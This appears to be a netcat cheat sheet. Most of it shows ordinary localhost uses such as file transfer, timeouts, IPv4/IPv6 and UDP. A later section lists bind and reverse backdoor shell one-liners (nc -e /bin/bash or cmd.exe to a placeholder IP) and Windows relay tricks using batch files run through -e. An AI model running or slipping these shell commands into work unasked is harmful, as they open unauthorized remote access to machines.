**Listening from incoming connection
Server :
$ nc -l 2389

Client :
$ nc localhost 2389

Client :
$ nc localhost 2389
HI, server-------------|
                       |
Server :               |
$ nc -l 2389           |
HI, server-------------|


**Use Netcat to Transfer Files

Client:       [hasdata - with data]
$ cat hasdata
hello server

Server :      [meblank - blank file]
$ nc -l 2389 > meblank

Client :
cat hasdata | nc localhost 2389

Server :      [meblank <- hasdata]
$ cat meblank
hello server


**Netcat Supports Timeouts

-w  -   specify the timeout in a connection

Server :
$ nc -l 2389

Client :
$ nc -w 10 localhost 2389


[NOTE : Do not use the -w flag with -l flag at the server side as in that case -w flag causes no effect and hence the connection remains open forever.]

**Netcat Supports IPV4+IPV6 Connectivity
-4  -   Use IPv4 addresses
-6  -   Use IPv6 addresses

Server :
$ nc -4 -l 2389

Client :
$ nc -4 localhost 2389

Now run the netstat command :
$ netstat | grep 2389
tcp        0      0 localhost:2389          localhost:50851         ESTABLISHED
tcp        0      0 localhost:50851         localhost:2389          ESTABLISHED


Server :
$ nc -6 -l 2389

Client :
$ nc -6 localhost 2389

Now run the netstat command :
$ netstat | grep 2389
tcp6       0      0 localhost:2389          localhost:33234         ESTABLISHED
tcp6       0      0 localhost:33234         localhost:2389          ESTABLISHED

**Disable Reading from STDIN in Netcat

-d  -   the read from stdin has been disabled

Server :
$ nc -l 2389

Client :
$ nc -d localhost 2389
Hi
[The text ‘Hi’ will not be sent to the server end]

**Force Netcat Server to Stay Up

Server :
$ nc -l 2389

Client :
$ nc localhost 2389
^C

Server :
$ nc -l 2389
$
[As soon as the client got disconnected the server was also terminated.]

-k  -   server remains up even if the client got disconnected.

Server :
$ nc -k -l 2389

Client :
$ nc localhost 2389
^C

Server :
$ nc -k -l 2389

**Configure Netcat Client to Stay Up after EOF

-q  -   flag expects a number of seconds to wait before client terminates (after receiving EOF)

Client :
$ nc  -q 5  localhost 2389

[Now if the client ever receives an EOF then it will wait for 5 seconds before terminating.]

**Use Netcat with UDP Protocol

-u  -   Enable UDP Protocol

Server :
$ nc -4 -u -l 2389

Client :
$ nc -4 -u localhost 2389


$ netstat | grep 2389
udp        0      0 localhost:42634         localhost:2389          ESTABLISHED

-----------------------------------------------------------------------------------------------

**Listening Backdoor Shell
> On Linux
$ nc -l -p [localport] -e /bin/bash

> On Windows
C:\> nc -l -p [localport] -e cmd.exe

**Reverse Backdoor Shell
> On Linux
$ nc [IP] [port] -e /bin/bash

> On Windows
C:\> nc [IP] [port] -e cmd.exe

-----------------------------------------------------------------------------------------------

**Netcat Relays on Windows

1. Create a temporary directory to store *.bat files

[Listener-to-Client]
          |   
          |   Server{SEND}--------->(relay.bat)---------->Client{EXECUTE}
          | [ClientIP][port]                                [port]
Server :
C:\> echo nc [ClientIP][port] > relay.bat
Client :
C:\> nc -l -p [port] -e relay.bat

[Listener-to-Listener]
          |   
          |   Server{SEND}--------->(relay.bat)---------->Server{EXECUTE}
          |     [port_1]                                     [port_2]
Server :
C:\> echo nc -l -p [port_2] > relay.bat
Server :
C:\> nc -l -p [port_1] -e relay.bat

[Client-to-Client]
          |   
          |   Server{SEND}--------->(relay.bat)---------->Client{EXECUTE}
          | [ClientIP][port]                                [port]
Client :
C:\> echo nc [ClientIP][port] > relay.bat
Client :
C:\> nc -l -p [port] -e relay.bat
